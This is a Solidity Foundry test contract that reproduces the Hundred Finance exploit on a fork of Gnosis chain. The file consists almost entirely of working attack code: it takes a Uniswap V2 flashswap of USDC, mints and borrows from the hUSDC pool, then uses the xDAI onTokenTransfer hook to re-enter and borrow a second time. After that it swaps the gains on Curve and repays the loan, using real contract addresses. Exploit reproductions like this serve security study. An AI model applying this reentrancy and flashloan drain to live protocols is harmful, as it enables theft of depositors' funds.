// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {ICompound} from '../../utils/ICompound.sol';
import {ICurve} from '../../utils/ICurve.sol';
import {IUniswapV2Pair} from '../../utils/IUniswapV2Pair.sol';

import {IERC20} from '../../interfaces/IERC20.sol';
import {IWETH9} from '../../interfaces/IWETH9.sol';

IERC20 constant usdc  = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
IERC20 constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

address constant husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee; // HUNDRED USDC POOL
address constant hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE; // HUNDRED XDAI POOL

contract Exploit_HundredFinance is TestHarness {
    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Pair private constant pairUsdcWxdai = IUniswapV2Pair(0xA227c72a4055A9DC949cAE24f54535fe890d3663);

    uint256 amountBorrowed;
    uint16 timesBorrowed;

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 21120319); // We pin one block before the exploit happened.
    }

    receive() external payable {
        emit log_named_decimal_uint('Native tokens balance after receive fallback', address(this).balance, 18);
    } 

    function test_attack() external {
        // First, flashswap some usdc from the pair
        // If we ask for the whole balance, reverts with INSUFFICIENT_LIQUIDITY
        uint256 borrowAmount = usdc.balanceOf(address(pairUsdcWxdai)) - 1; 
        console.log('------- STEP 1: FLASHSWAP -------');
        pairUsdcWxdai.swap(
            pairUsdcWxdai.token0() == address(wxdai) ? 0 : borrowAmount,
            pairUsdcWxdai.token0() == address(wxdai) ? borrowAmount : 0,
            address(this),
            abi.encode("0xdeadbeef") // trigger the loan by sending arbitrary data
        );
    }

    // Flashswap callback
    function uniswapV2Call(address sender, uint256 _amount0, uint256 _amount1, bytes calldata ) external {
        require(sender == address(this), 'Not requested by this');
        require(msg.sender == address(pairUsdcWxdai), 'Only callable by pair');

        console.log('------- STEP 2: FLASHSWAP CALLBACK -------');
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        amountBorrowed = amountToken;
        console.log('Attacker Contract balance after flashswap');
        logBalances(address(this));       

        console.log('------- STEP 3: HUSDC BORROW -------');
        uint256 balance = usdc.balanceOf(address(this));
        usdc.approve(husd, balance);
        ICompound(husd).mint(balance);

        uint256 amount = (amountBorrowed * 90) / 100;
        ICompound(husd).borrow(amount);

        console.log('Attacker balances after HUSDC borrow');
        logBalances(address(this));

        console.log('Hundred balances after HUSDC borrow');
        logBalances(husd);

        console.log('------- STEP 4: SWAP EARNINGS -------');
        IWETH9(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
        console.log('Attacker balances after swapping');
        logBalances(address(this));

        console.log('------- STEP 5: REPAY FLASHLOAN -------');
        uint256 amountRepay = ((amountToken * 1000) / 997) + 1; // Repay amount + fees.
        require(usdc.transfer(address(pairUsdcWxdai), amountRepay), 'usdc payback failed');
        emit log_named_decimal_uint('USDC Repaid', amountRepay, 6);
        console.log('\n');

        console.log('------- STEP 6: ENDING BALANCES -------');
        console.log('Attacker');
        logBalances(address(this));

        console.log('Hundred DAI Pool');
        logBalances(hxdai);

        console.log('Hundred USDC Pool');
        logBalances(husd);
    }

    // Logic made in the token hook. This will be called every time an xDAI transfer is made to this contract.
    function onTokenTransfer(address sender, uint256 , bytes memory ) external {
        // We do not want to revert as this hook is called on transfers, just control the logic executed.
        if(sender != address(pairUsdcWxdai) && timesBorrowed == 0){
            emit log_string('------- onTokenTransfer HOOK -------');
            borrowXDAI();
        }
    }

    function borrowXDAI() public {
        timesBorrowed++;

        uint amount = ((amountBorrowed * 1e12) * 60) / 100;

        ICompound(hxdai).borrow(amount);

        console.log('Attacker Balances after XDAI borrow in hook');
        logBalances(address(this));

        console.log('Hundred Balances after XDAI borrow in hook');
        logBalances(hxdai);
    }

    function logBalances(address _from) internal {
        emit log_named_decimal_uint('NATIVE TOKENS', _from.balance, 18);
        emit log_named_decimal_uint('USDC', usdc.balanceOf(_from), 6);
        emit log_named_decimal_uint('WXDAI', wxdai.balanceOf(_from), 18);
        console.log('\n');
    }
    
}
